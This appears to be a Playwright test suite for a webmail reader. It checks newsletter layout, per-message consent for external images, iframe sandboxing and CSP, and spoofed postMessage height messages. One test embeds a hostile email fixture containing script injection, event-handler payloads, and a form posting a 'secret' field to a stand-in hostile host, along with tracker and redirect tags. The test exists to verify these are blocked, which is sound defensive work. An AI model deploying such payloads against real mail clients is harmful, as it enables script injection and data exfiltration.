import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { after, before, test } from 'node:test';
import { chromium } from 'playwright';
import { newsletter, rasterPngBase64 } from './fixtures/rich-newsletter.mjs';

// CI browser coverage. Serve the actual reader assets and the same HTTP CSP as the Worker;
// never use setContent/srcdoc, which would miss the opaque-origin and policy boundaries.
const origin = 'https://mail.veyro.dk';
const imageUrl = 'https://images.example.test/newsletter.png';
const parentPolicy = "default-src 'none'; script-src 'self'; style-src 'self'; connect-src 'self'; img-src 'self'; font-src 'self'; frame-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'; object-src 'none'";
const framePolicy = images => `default-src 'none'; script-src ${origin}/message-frame.js; style-src 'unsafe-inline'; img-src data:${images ? ' https:' : ''}; font-src 'none'; connect-src 'none'; frame-src 'none'; frame-ancestors 'self'; base-uri 'none'; form-action 'none'; object-src 'none'; sandbox allow-scripts allow-popups allow-popups-to-escape-sandbox`;
const mime = {html: 'text/html', js: 'text/javascript', css: 'text/css', svg: 'image/svg+xml', woff2: 'font/woff2'};
let browser;
before(async () => { browser = await chromium.launch({channel: process.env.WEBMAIL_BROWSER || undefined}); });
after(async () => { await browser?.close(); });

async function renderedFrame(page) {
  const content = page.frameLocator('.mail-frame');
  await content.locator('.newsletter-shell').waitFor();
  await content.locator('body').evaluate(async () => {
    await Promise.all(Array.from(document.images, image => image.decode()));
    await new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)));
  });
  await page.locator('.mail-frame:not([aria-busy])').waitFor();
  // Let image-dependent ResizeObserver reports reach the parent before reading frame geometry.
  await page.evaluate(() => new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve))));
  return content;
}

async function observeBlockedRequests(page) {
  // A bounded observation window for absence assertions, after explicit render/image readiness.
  // This does not depend on unrelated mailbox polling or document-wide network-idle bookkeeping.
  await page.waitForTimeout(100);
}

async function mailbox(t, viewport, messages = [newsletter]) {
  const context = await browser.newContext({viewport, isMobile: viewport.width === 375, hasTouch: viewport.width === 375});
  t.after(() => context.close());
  const requests = [], errors = [], policies = [];
  context.on('page', page => page.on('pageerror', error => errors.push(String(error))));
  // Observational instrumentation only: retain the actual parent-generated token for spoof tests.
  await context.addInitScript(() => {
    window.addEventListener('message', event => {
      if (event.data?.type === 'veyro-mail-init') window.__fixtureMailInit = event.data;
    });
  });
  await context.route('**/*', async route => {
    const request = route.request(), url = new URL(request.url());
    if (url.origin !== origin) {
      requests.push({url: request.url(), referer: request.headers().referer});
      if (request.url() === imageUrl) return route.fulfill({contentType: 'image/png', body: Buffer.from(rasterPngBase64, 'base64')});
      return route.fulfill({status: 204});
    }
    if (!url.pathname.startsWith('/api/')) {
      const frame = url.pathname === '/message-frame';
      const name = url.pathname === '/' ? 'inbox.html' : frame ? 'message-frame.html' : url.pathname.slice(1);
      assert.ok(['inbox.html', 'inbox.js', 'inbox.css', 'message-frame.html', 'message-frame.js', 'manrope.woff2', 'favicon.svg'].includes(name), name);
      const policy = frame ? framePolicy(url.searchParams.get('images') === '1') : parentPolicy;
      policies.push({path: url.pathname + url.search, policy});
      return route.fulfill({body: await readFile(new URL('./assets/' + name, import.meta.url)),
        contentType: mime[name.split('.').pop()], headers: {
          'Content-Security-Policy': policy, 'Referrer-Policy': 'no-referrer',
          'X-Content-Type-Options': 'nosniff', 'Cache-Control': 'no-store',
          'X-Frame-Options': frame ? 'SAMEORIGIN' : 'DENY',
        }});
    }
    let json;
    if (url.pathname === '/api/session') json = {email: 'you@example.test', csrfToken: 'fixture-token'};
    else if (url.pathname === '/api/folders') json = {folders: [{id: 'inbox', name: 'Indbakke', role: 'inbox', unread: 0}]};
    else if (url.pathname === '/api/messages') json = {
      messages: messages.map(({html, text, attachments, security, ...summary}) => summary), nextCursor: null, availableLabels: [],
    };
    else if (url.pathname.startsWith('/api/messages/')) {
      assert.equal(request.method(), 'GET');
      json = messages.find(message => message.id === url.pathname.split('/')[3]);
      assert.ok(json, 'Expected a fixture message: ' + url.pathname);
    } else assert.fail('Unexpected API route: ' + url.pathname);
    return route.fulfill({json});
  });
  const page = await context.newPage();
  await page.goto(origin);
  await page.locator('.message-row').first().waitFor();
  t.after(() => assert.deepEqual(errors, []));
  async function open(id = newsletter.id) {
    if (await page.locator('#back').isVisible()) await page.locator('#back').click();
    await page.locator(`li[data-mail="${id}"] .message-row`).click();
    return renderedFrame(page);
  }
  return {page, open, requests, policies};
}

test('repeated clicks on an opening or displayed message share the original read', async t => {
  const {page} = await mailbox(t, {width: 1440, height: 1000});
  await page.evaluate(() => {
    const original = window.fetch;
    window.fixtureDetailReads = 0;
    window.fetch = async (...args) => {
      if (String(args[0]).startsWith('/api/messages/')) {
        window.fixtureDetailReads++;
        await new Promise(resolve => { window.releaseDetailRead = resolve; });
      }
      return original(...args);
    };
  });
  const row = page.locator('.message-row').first();
  await row.click();
  await row.click();
  assert.equal(await page.evaluate(() => window.fixtureDetailReads), 1);
  await page.evaluate(() => window.releaseDetailRead());
  await renderedFrame(page);
  await row.click();
  assert.equal(await page.evaluate(() => window.fixtureDetailReads), 1);
});

for (const viewport of [{width: 1440, height: 1000}, {width: 375, height: 812}]) {
  test(`preserves newsletter layout and inline images at ${viewport.width}px; external images require this message's consent`, async t => {
    const second = {...newsletter, id: '1.3', subject: 'Et andet nyhedsbrev'};
    const {page, open, requests, policies} = await mailbox(t, viewport, [newsletter, second]);
    let content = await open();
    await observeBlockedRequests(page);
    assert.equal(await content.locator('#newsletter-inline').evaluate(image => image.naturalWidth), 600);
    assert.equal(await content.locator('#newsletter-reused-inline').getAttribute('src'), await content.locator('#newsletter-inline').getAttribute('src'));
    assert.deepEqual(requests, []);
    assert.equal(await content.locator('#newsletter-hero').evaluate(element => element.tagName), 'SPAN');
    assert.equal(await content.locator('#newsletter-hero').getAttribute('role'), 'img');
    assert.equal(await content.locator('.newsletter-shell').evaluate(element => getComputedStyle(element).backgroundColor), 'rgb(248, 245, 239)');
    assert.equal(await content.locator('.newsletter-heading').evaluate(element => getComputedStyle(element).color), 'rgb(23, 62, 53)');
    const button = content.getByRole('link', {name: 'Se kollektionen →'});
    assert.equal(await button.evaluate(element => getComputedStyle(element).backgroundColor), 'rgb(36, 90, 72)');
    assert.equal(await button.evaluate(element => getComputedStyle(element).borderRadius), '24px');
    assert.equal(await content.locator('td').evaluateAll(cells => cells.every(cell => {
      const style = getComputedStyle(cell);
      return ['Top', 'Right', 'Bottom', 'Left'].every(side => style['border' + side + 'Width'] === '0px');
    })), true, 'Presentation tables must not gain reader-supplied cell borders');
    const firstBox = await content.locator('#newsletter-first-card').boundingBox();
    const secondBox = await content.locator('#newsletter-second-card').boundingBox();
    if (viewport.width === 375) {
      assert.ok(secondBox.y >= firstBox.y + firstBox.height - 1, 'Cards should stack at mobile width');
      assert.equal(await content.locator('.newsletter-heading').evaluate(element => getComputedStyle(element).fontSize), '28px');
    } else {
      assert.ok(Math.abs(secondBox.y - firstBox.y) < 1, 'Cards should share their original table row');
      assert.ok(secondBox.x >= firstBox.x + firstBox.width - 1);
      assert.equal(await content.locator('.newsletter-heading').evaluate(element => getComputedStyle(element).fontSize), '34px');
    }
    assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true);
    assert.equal(await content.locator('body').evaluate(() => document.documentElement.scrollWidth <= innerWidth + 1), true);
    const preConsentFrame = await page.locator('.mail-frame').getAttribute('src');
    assert.equal(preConsentFrame, '/message-frame?v=1');
    await page.getByRole('button', {name: 'Vis billeder', exact: true}).click();
    content = await renderedFrame(page);
    assert.equal(await content.locator('#newsletter-hero').evaluate(image => image.naturalWidth), 600);
    assert.deepEqual(requests.map(request => request.url), [imageUrl]);
    assert.equal(requests[0].referer, undefined);
    assert.equal(await page.locator('.mail-frame').getAttribute('src'), '/message-frame?v=1&images=1');
    assert.ok(policies.some(response => response.path === '/message-frame?v=1' && response.policy.includes('img-src data:;')));
    assert.ok(policies.some(response => response.path === '/message-frame?v=1&images=1' && response.policy.includes('img-src data: https:;')));
    await page.getByRole('button', {name: 'Vis som tekst', exact: true}).click();
    assert.equal(await page.locator('.mail-plain').textContent(), newsletter.text);
    assert.equal(await page.locator('.mail-frame').count(), 0);
    await page.getByRole('button', {name: 'Vis original opsætning', exact: true}).click();
    content = await renderedFrame(page);
    assert.equal(await content.locator('img#newsletter-hero').evaluate(image => image.naturalWidth), 600);
    const beforeSecond = requests.length;
    content = await open(second.id);
    await observeBlockedRequests(page);
    assert.equal(await content.locator('#newsletter-hero').evaluate(element => element.tagName), 'SPAN');
    assert.equal(await page.getByRole('button', {name: 'Vis billeder', exact: true}).isVisible(), true);
    assert.equal(requests.length, beforeSecond, 'Permission must not leak into another message');
    await open(newsletter.id);
    await observeBlockedRequests(page);
    assert.equal(await page.getByRole('button', {name: 'Vis billeder', exact: true}).isVisible(), true);
    assert.equal(await page.locator('.mail-frame').getAttribute('src'), '/message-frame?v=1');
    assert.equal(requests.length, beforeSecond, 'Reopening a message requires fresh permission');
  });
}

test('sender content is sandboxed, cannot run scripts/forms or load remote CSS, and cannot style or read the parent', async t => {
  const hostile = {...newsletter, html: newsletter.html + `
    <style>@import url("https://hostile.example.test/import.css");
      @font-face {font-family:Spy;src:url("https://hostile.example.test/font.woff2")}
      #workspace,.message-row {display:none!important} body {--sender-canary:present}
      .remote-background {background-image:url("https://hostile.example.test/tracker.png")}
    </style>
    <link rel="stylesheet" href="https://hostile.example.test/style.css">
    <script>window.__senderExecuted=true;parent.document.body.textContent='replaced'</script>
    <script src="https://hostile.example.test/script.js"></script>
    <img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" onerror="window.__senderExecuted=true" alt="Unsafe vector">
    <form action="https://hostile.example.test/submit"><input name="secret"><button>Send</button></form>
    <iframe src="https://hostile.example.test/frame"></iframe>
    <object data="https://hostile.example.test/object"></object>
    <base href="https://hostile.example.test/"><meta http-equiv="refresh" content="0;url=https://hostile.example.test/redirect">
    <p class="remote-background" onclick="window.__senderExecuted=true">Content remains readable</p>`};
  const {page, open, requests} = await mailbox(t, {width: 1440, height: 1000}, [hostile]);
  const content = await open();
  await observeBlockedRequests(page);
  assert.deepEqual(requests, []);
  assert.equal(await content.locator('body').locator('script,form,input,button,iframe,object,link,base,meta,[onclick],[onerror]').count(), 0);
  assert.equal(await content.locator('body').evaluate(() => window.__senderExecuted), undefined);
  assert.equal(await page.evaluate(() => window.__senderExecuted), undefined);
  assert.equal(await page.locator('#workspace').isVisible(), true);
  assert.equal(await page.locator('.message-row').first().isVisible(), true);
  assert.equal(await page.evaluate(() => getComputedStyle(document.body).getPropertyValue('--sender-canary')), '');
  assert.equal(await content.locator('body').evaluate(() => getComputedStyle(document.body).getPropertyValue('--sender-canary')), 'present');
  assert.equal(await content.locator('body').evaluate(() => {
    try { return parent.document.body ? 'readable' : 'missing'; } catch (error) { return error.name; }
  }), 'SecurityError');
  assert.equal(await page.locator('.mail-frame').getAttribute('sandbox'), 'allow-scripts allow-popups allow-popups-to-escape-sandbox');
  assert.equal(await content.locator('body').evaluate(() => self.origin), 'null');
  assert.doesNotMatch(await content.locator('style').allTextContents().then(styles => styles.join('\n')), /@import|@font-face|hostile\.example/);
  assert.equal(await content.getByText('Content remains readable').isVisible(), true);
});

test('height messages require the current frame and its fresh token', async t => {
  const {page, open} = await mailbox(t, {width: 1440, height: 1000});
  await open();
  await page.evaluate(() => { window.__fixtureOldWindow = document.querySelector('.mail-frame').contentWindow; });
  await page.getByRole('button', {name: 'Vis billeder', exact: true}).click();
  const content = await renderedFrame(page);
  const token = await content.locator('body').evaluate(() => window.__fixtureMailInit.token);
  const height = await page.locator('.mail-frame').evaluate(frame => frame.style.height);
  assert.match(token, /^[a-f0-9]{32}$/);
  async function unchanged() {
    await page.evaluate(() => new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve))));
    assert.equal(await page.locator('.mail-frame').evaluate(frame => frame.style.height), height);
  }
  await page.evaluate(token => window.postMessage({type: 'veyro-mail-size', token, height: 15337}, '*'), token);
  await unchanged();
  await page.evaluate(token => {
    if (window.__fixtureOldWindow === document.querySelector('.mail-frame').contentWindow) throw Error('Expected a new frame');
    window.dispatchEvent(new MessageEvent('message', {source: window.__fixtureOldWindow, origin: 'null',
      data: {type: 'veyro-mail-size', token, height: 15337}}));
  }, token);
  await unchanged();
  await content.locator('body').evaluate(() => parent.postMessage({type: 'veyro-mail-size', token: '0'.repeat(32), height: 15337}, '*'));
  await unchanged();
  for (const invalidHeight of [NaN, Infinity, '15337', null]) {
    await content.locator('body').evaluate(({token, height}) => parent.postMessage({type: 'veyro-mail-size', token, height}, '*'), {token, height: invalidHeight});
    await unchanged();
  }
});
